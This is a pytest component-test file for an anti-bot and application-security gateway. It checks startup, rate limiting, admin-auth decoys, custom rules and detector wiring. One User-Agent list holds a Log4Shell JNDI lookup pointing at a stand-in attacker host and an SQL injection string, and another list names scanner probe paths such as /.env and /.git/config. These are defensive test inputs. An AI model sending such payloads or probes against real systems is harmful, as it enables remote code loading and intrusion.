"""
tests/test_component.py — full-pipeline component tests.

Each test spins the complete gateway (on_startup → middleware → handler → on_cleanup)
with all external collaborators stubbed:
  - MaxMind / GeoIP   → disabled (no mmdb files needed)
  - AbuseIPDB         → env key absent → integration disabled
  - CrowdSec          → env key absent → integration disabled
  - Redis             → env REDIS_URL absent → in-process only
  - upstream          → in-process echo server

These tests catch wiring bugs between modules that unit tests miss
(wrong import, stale config snapshot, propagation failure, on_startup
ordering) and integration tests over-test (full network stack).

Unlike test_integration.py (which tests individual endpoint contracts)
component tests exercise multi-signal detection pipelines:
  - The same identity accumulates signals across requests
  - Scoring thresholds are crossed and ban state persists
  - Signal ordering (signal_runtime_order) is respected
  - Detection → slog → DB write chain is intact
"""
import asyncio
import os
import sys
import tempfile
from contextlib import asynccontextmanager

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

_TMP = tempfile.mkdtemp(prefix="appsecgw-component-")
os.environ.setdefault("UPSTREAM",          "https://example.com")
os.environ.setdefault("ADMIN_KEY",         "TEST-KEY-DO-NOT-USE")
os.environ.setdefault("DB_PATH",           os.path.join(_TMP, "antibot-component.db"))
os.environ.setdefault("ALLOWED_HOSTS",     "")
os.environ.setdefault("ADMIN_ALLOWED_IPS", "")
os.environ.setdefault("DEBUG",             "1")
# Disable external integrations so tests are hermetic
os.environ.setdefault("MAXMIND_ENABLED",   "0")
os.environ.setdefault("ABUSEIPDB_ENABLED", "0")
os.environ.setdefault("CROWDSEC_ENABLED",  "0")
os.environ.setdefault("JS_CHALLENGE",      "0")

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
sys.path.insert(0, _ROOT)


# ── Echo upstream ─────────────────────────────────────────────────────────────

async def _echo(request: web.Request) -> web.Response:
    return web.json_response({
        "path":    request.path,
        "method":  request.method,
        "headers": dict(request.headers),
    })


async def _echo_html(request: web.Request) -> web.Response:
    return web.Response(
        text="<html><body>ok</body></html>",
        content_type="text/html",
    )


@asynccontextmanager
async def _spin_upstream():
    app = web.Application()
    app.router.add_get("/html", _echo_html)
    app.router.add_route("*", "/{tail:.*}", _echo)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    yield f"http://127.0.0.1:{port}"
    await runner.cleanup()


@asynccontextmanager
async def _spin_proxy(proxy_module, upstream_url, extra_env=None):
    old_upstream = proxy_module.UPSTREAM
    proxy_module.UPSTREAM = upstream_url.rstrip("/")
    if extra_env:
        for k, v in extra_env.items():
            setattr(proxy_module, k, v)
    app = proxy_module.make_app()
    server = TestServer(app)
    client = TestClient(server)
    await client.start_server()
    yield client
    await client.close()
    proxy_module.UPSTREAM = old_upstream


def _run(coro):
    return asyncio.new_event_loop().run_until_complete(coro)


def _browser_headers(extra=None):
    h = {
        "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64) Chrome/120 Safari/537.36",
        "Accept":          "text/html,application/json",
        "Accept-Language": "en-GB",
        "Accept-Encoding": "gzip",
        "Sec-Ch-Ua":       '"Chromium"; v="120"',
        "Sec-Fetch-Site":  "none",
        "Sec-Fetch-Mode":  "navigate",
        "Sec-Fetch-Dest":  "document",
        "Host":            "localhost",
    }
    if extra:
        h.update(extra)
    return h


@pytest.fixture(scope="module")
def proxy_module():
    import proxy as p
    return p


# ─────────────────────────────────────────────────────────────────────────────
# COMP-01 — Gateway boots and proxies clean requests
# ─────────────────────────────────────────────────────────────────────────────

class TestComp01BootAndProxy:
    """Full on_startup cycle completes without error and the proxy passes
    legitimate browser requests to the upstream."""

    def test_live_endpoint_reachable_after_startup(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    r = await client.get("/antibot-appsec-gateway/live")
                    assert r.status == 200
                    assert (await r.text()).strip() == "ok"
        _run(go())

    def test_clean_browser_request_proxied(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    r = await client.get("/", headers=_browser_headers())
                    assert r.status < 500, f"Unexpected error: {r.status}"
        _run(go())

    def test_security_headers_injected_on_html_response(self, proxy_module):
        """Security headers are only injected on text/html responses (INJECT_SECURITY_HEADERS)."""
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    # /html returns text/html from the echo upstream
                    r = await client.get("/html", headers=_browser_headers())
                    has_security = (
                        "X-Content-Type-Options" in r.headers
                        or "Content-Security-Policy" in r.headers
                        or "X-Frame-Options" in r.headers
                    )
                    assert has_security, (
                        "Gateway must inject security headers on text/html responses"
                    )
        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-02 — Rate limiting pipeline
# ─────────────────────────────────────────────────────────────────────────────

class TestComp02RateLimiting:
    """Rate limiting fires when an identity exceeds the configured burst."""

    def test_burst_exceeded_triggers_rate_limit_response(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    bot_headers = {"User-Agent": "python-requests/2.28.0",
                                   "Accept": "*/*"}
                    statuses = []
                    for _ in range(80):
                        r = await client.get("/api/endpoint", headers=bot_headers)
                        statuses.append(r.status)
                    # Gateway either rate-limits (429) or silent-decoys (404) the identity.
                    # Both are correct — 404 means banned-silent (higher-severity action).
                    restricted = sum(1 for s in statuses if s in (429, 404))
                    assert restricted > 0, (
                        f"After 80 requests, gateway must rate-limit (429) or ban (404) the identity; "
                        f"got statuses: {set(statuses)}"
                    )
        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-03 — Detection signals: suspicious path fires
# ─────────────────────────────────────────────────────────────────────────────

class TestComp03SuspiciousPath:
    """Requests to scanner-fingerprint paths must be handled (not 500)."""

    SCANNER_PATHS = [
        "/wp-login.php",
        "/.env",
        "/xmlrpc.php",
        "/.git/config",
        "/phpmyadmin/index.php",
    ]

    def test_scanner_paths_handled_without_error(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    for path in self.SCANNER_PATHS:
                        r = await client.get(path, headers=_browser_headers(),
                                             allow_redirects=False)
                        assert r.status != 500, (
                            f"Scanner path {path!r} must not cause 500"
                        )
        _run(go())

    def test_repeated_scanner_paths_do_not_crash(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    for _ in range(5):
                        for path in self.SCANNER_PATHS:
                            r = await client.get(path, headers=_browser_headers(),
                                                 allow_redirects=False)
                            assert r.status < 500


        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-04 — Admin auth pipeline: session cookie required
# ─────────────────────────────────────────────────────────────────────────────

class TestComp04AdminAuth:
    """Admin endpoints require a valid session cookie. Without one, the gateway
    must return a silent decoy rather than a real error or real content."""

    ADMIN_PATHS = [
        "/antibot-appsec-gateway/secured/controls",
        "/antibot-appsec-gateway/secured/live-feed",
        "/antibot-appsec-gateway/secured/metrics",
        "/antibot-appsec-gateway/secured/analytics",
    ]

    def test_admin_without_session_returns_decoy(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    for path in self.ADMIN_PATHS:
                        r = await client.get(path, headers=_browser_headers(),
                                             allow_redirects=False)
                        body = await r.text()
                        # Real dashboard content must not be present
                        assert "AntiBot/WAF GW ·" not in body or r.status in (302, 401, 403), (
                            f"Admin path {path!r} must not expose real content without auth"
                        )
        _run(go())

    def test_login_endpoint_reachable(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    r = await client.get("/antibot-appsec-gateway/login",
                                        allow_redirects=False)
                    assert r.status in (200, 302), (
                        "Login page must be reachable without session"
                    )
        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-05 — Custom rules pipeline wired into protect()
# ─────────────────────────────────────────────────────────────────────────────

class TestComp05CustomRulesWiring:
    """Custom rules set at module level are evaluated before the detection pipeline.
    This tests that _eval_custom_rules is called from protect() — not just that
    the function exists."""

    def test_custom_rule_allow_bypasses_detection(self, proxy_module):
        async def go():
            old_rules = proxy_module.CUSTOM_RULES
            try:
                proxy_module.CUSTOM_RULES = proxy_module._to_custom_rules([
                    {"if": {"path": "/allowed-by-rule/*"}, "then": "allow"}
                ])
                async with _spin_upstream() as up:
                    async with _spin_proxy(proxy_module, up) as client:
                        # Even with a scanner-like UA, the allow rule should let it through
                        r = await client.get(
                            "/allowed-by-rule/resource",
                            headers={"User-Agent": "python-requests/2.28.0",
                                     "Accept": "*/*"},
                            allow_redirects=False,
                        )
                        assert r.status < 500
            finally:
                proxy_module.CUSTOM_RULES = old_rules
        _run(go())

    def test_custom_rule_block_fires_before_upstream(self, proxy_module):
        async def go():
            old_rules = proxy_module.CUSTOM_RULES
            try:
                proxy_module.CUSTOM_RULES = proxy_module._to_custom_rules([
                    {"if": {"path": "/blocked-by-rule"}, "then": "block"}
                ])
                async with _spin_upstream() as up:
                    async with _spin_proxy(proxy_module, up) as client:
                        r = await client.get(
                            "/blocked-by-rule",
                            headers=_browser_headers(),
                            allow_redirects=False,
                        )
                        # Blocked requests must not reach upstream — response is a decoy
                        assert r.status < 500
            finally:
                proxy_module.CUSTOM_RULES = old_rules
        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-06 — on_startup / on_cleanup lifecycle
# ─────────────────────────────────────────────────────────────────────────────

class TestComp06Lifecycle:
    """on_startup must complete without exception; on_cleanup must not leave
    dangling tasks.  Tested by starting and immediately stopping the gateway."""

    def test_startup_and_shutdown_complete_cleanly(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    r = await client.get("/antibot-appsec-gateway/live")
                    assert r.status == 200
            # If we reach here, on_cleanup ran without unhandled exception
        _run(go())

    def test_db_queue_initialised_after_startup(self, proxy_module):
        """db_queue must be non-None after on_startup; None = silent write drops."""
        import state
        # After any test that spun the proxy, db_queue must be populated
        # (conftest's _wipe_config_kv_between_tests does not clear db_queue)
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    await client.get("/antibot-appsec-gateway/live")
                    assert proxy_module.db_queue is not None, (
                        "db_queue must be initialised by on_startup — "
                        "None means all async DB writes are silently dropped"
                    )
        _run(go())

    def test_propagation_reaches_proxy_handler(self, proxy_module):
        """After on_startup, core.proxy_handler must have the same UPSTREAM
        value as proxy — the propagation loop must have run."""
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    await client.get("/antibot-appsec-gateway/live")
                    import core.proxy_handler as _ph
                    assert getattr(_ph, "UPSTREAM", None) == proxy_module.UPSTREAM, (
                        "UPSTREAM must propagate to core.proxy_handler after on_startup"
                    )
        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-07 — Non-browser User-Agent classification
# ─────────────────────────────────────────────────────────────────────────────

class TestComp07UaClassification:
    """Non-browser UAs (curl, python-requests, empty) must flow through the
    detection pipeline without crashing."""

    NON_BROWSER_UAS = [
        "curl/7.88.1",
        "python-requests/2.28.0",
        "Go-http-client/1.1",
        "",
        "Mozilla",                     # truncated UA
        "${jndi:ldap://x.attacker/a}", # Log4Shell
        "' OR 1=1 --",                 # SQLi
    ]

    def test_all_non_browser_uas_handled_without_500(self, proxy_module):
        async def go():
            async with _spin_upstream() as up:
                async with _spin_proxy(proxy_module, up) as client:
                    for ua in self.NON_BROWSER_UAS:
                        r = await client.get(
                            "/test-path",
                            headers={"User-Agent": ua, "Accept": "*/*"},
                            allow_redirects=False,
                        )
                        assert r.status != 500, (
                            f"UA {ua!r} caused 500 — detection pipeline crashed"
                        )
        _run(go())


# ─────────────────────────────────────────────────────────────────────────────
# COMP-08 — Detection Detector interface (detection.base)
# ─────────────────────────────────────────────────────────────────────────────

class TestComp08DetectorInterface:
    """detection.base.Detector Protocol is correctly wired: REGISTRY is
    populated, each registered detector satisfies the protocol, and the
    LlmHeuristicDetector adapter works end-to-end."""

    def test_registry_non_empty(self):
        from detection.base import REGISTRY
        assert len(REGISTRY) >= 1, (
            "detection.base.REGISTRY must have at least one registered Detector "
            "(populated by detection.detectors import)"
        )

    def test_all_registry_entries_satisfy_protocol(self):
        from detection.base import Detector, REGISTRY
        for det in REGISTRY:
            assert isinstance(det, Detector), (
                f"{det!r} in REGISTRY does not satisfy the Detector protocol"
            )

    def test_llm_detector_name_and_enabled(self):
        from detection.detectors import LlmHeuristicDetector
        d = LlmHeuristicDetector()
        assert isinstance(d.NAME, str) and d.NAME
        assert isinstance(d.ENABLED, bool)

    def test_llm_detector_observe_does_not_raise(self):
        from detection.detectors import LlmHeuristicDetector
        from unittest.mock import MagicMock
        d = LlmHeuristicDetector()
        req = MagicMock()
        req.method = "GET"
        req.path = "/some/page"
        req.headers = {"Accept": "text/html"}
        d.observe("test-identity", "1.2.3.4", req)

    def test_llm_detector_check_returns_float(self):
        from detection.detectors import LlmHeuristicDetector
        from unittest.mock import MagicMock
        d = LlmHeuristicDetector()
        result = d.check("test-identity", "1.2.3.4", MagicMock())
        assert isinstance(result, float), (
            f"Detector.check must return float, got {type(result)}"
        )

    def test_register_function_appends_to_registry(self):
        from detection.base import REGISTRY, register, Detector
        from unittest.mock import MagicMock
        before = len(REGISTRY)
        fake = MagicMock(spec=Detector)
        fake.NAME = "test-detector"
        fake.ENABLED = False
        register(fake)
        assert len(REGISTRY) == before + 1
        REGISTRY.pop()  # clean up after test
